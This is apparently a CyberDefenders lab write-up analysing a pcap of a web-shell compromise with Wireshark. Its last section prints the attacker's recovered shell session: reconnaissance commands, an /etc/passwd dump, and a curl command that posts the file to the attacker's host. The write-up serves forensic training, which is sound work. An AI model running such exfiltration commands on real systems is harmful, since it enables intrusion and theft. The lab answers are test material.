---
title: WebStrike
date: 2024-09-04 00:00:00 -500
categories: [DFIR, Network Forensics]
tags: [CyberDefenders]
---

# Scenario:

An anomaly was discovered within our company's intranet as our Development team found an unusual file on one of our web servers. Suspecting potential malicious activity, the network team has prepared a pcap file with critical network traffic for analysis for the security team, and you have been tasked with analyzing the pcap.


# Tools:

- Wireshark


### Q1: Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?

First, let's figure out the IP address of the attacker: `Statistics > Conversations`

![](/assets/img/Pasted image 20240725130223.png)

```c
- Attacker: 117.11.88.124
- Victim: 24.49.63.79
```

- Now, checking the `Endpoints` information:

![](/assets/img/Pasted image 20240725130323.png)

	- Answer should be in here but I dont have maxmind db downloaded!


-> Answer: 
```c
City: Tianjin, Country: China, AS Number: 4837, AS Organization: CHINA UNICOM China169 Backbone
```


### Q2: Knowing the attacker's user-agent assists in creating robust filtering rules. What's the attacker's user agent?

Wireshark query:
```c
ip.addr == 117.11.88.124 && http.user_agent
```

![](/assets/img/Pasted image 20240725130938.png)

-> Answer: User-Agent:
```c
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```



### Q3: We need to identify if there were potential vulnerabilities exploited. What's the name of the malicious web shell uploaded?

From here:

![](/assets/img/Pasted image 20240725131243.png)

It mentions that the uploaded file is `image.php`:

![](/assets/img/Pasted image 20240725131157.png)

	- Not sure if this was successfully uploaded as it says "Invalid file format".


Diving into `/admin/uploads`:

![](/assets/img/Pasted image 20240725131432.png)

	- Doesn't exist.


Found this interesting upload:

![](/assets/img/Pasted image 20240725131729.png)


Digging into this packet by following its TCP or HTTP stream:

![](/assets/img/Pasted image 20240725132020.png)

	- No response. I guess it was successfully uploaded?

-> Answer: `image.jpg.php`


### Q4: Knowing the directory where files uploaded are stored is important for reinforcing defenses against unauthorized access. Which directory is used by the website to store the uploaded files?

-> Answer: `/reviews/uploads/`


### Q5: Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?

After the upload of the malicious web shell:

![](/assets/img/Pasted image 20240725132726.png)

	- We can see that the victim's machine is connecting to the attacker's machine at port 8080.



-> Answer: `8080`


### Q6: Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?

Attacker's action during the webshell compromise:
```c
/bin/sh: 0: can't access tty; job control turned off

$ whoami

www-data

$ uname -a

Linux ubuntu-virtual-machine 6.2.0-37-generic #38~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov 2 18:01:13 UTC 2 x86_64 x86_64 x86_64 GNU/Linux

$ pwd

/var/www/html/reviews/uploads

$ ls /home

ubuntu

$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin

systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin

messagebus:x:102:105::/nonexistent:/usr/sbin/nologin

systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin

syslog:x:104:111::/home/syslog:/usr/sbin/nologin

_apt:x:105:65534::/nonexistent:/usr/sbin/nologin

tss:x:106:113:TPM software stack,,,:/var/lib/tpm:/bin/false

uuidd:x:107:116::/run/uuidd:/usr/sbin/nologin

systemd-oom:x:108:117:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin

tcpdump:x:109:118::/nonexistent:/usr/sbin/nologin

avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin

usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin

kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin

avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin

cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin

rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin

whoopsie:x:117:124::/nonexistent:/bin/false

sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin

speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false

fwupd-refresh:x:120:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin

nm-openvpn:x:121:127:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin

saned:x:122:129::/var/lib/saned:/usr/sbin/nologin

colord:x:123:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin

geoclue:x:124:131::/var/lib/geoclue:/usr/sbin/nologin

pulse:x:125:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin

gnome-initial-setup:x:126:65534::/run/gnome-initial-setup/:/bin/false

hplip:x:127:7:HPLIP system user,,,:/run/hplip:/bin/false

gdm:x:128:134:Gnome Display Manager:/var/lib/gdm3:/bin/false

ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash

$ curl -X POST -d /etc/passwd http://117.11.88.124:443/

% Total % Received % Xferd Average Speed Time Time Time Current

Dload Upload Total Spent Left Speed

  

0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0

100 368 100 357 100 11 56774 17[393 bytes missing in capture file].$
```

-> Answer: `/etc/passwd`




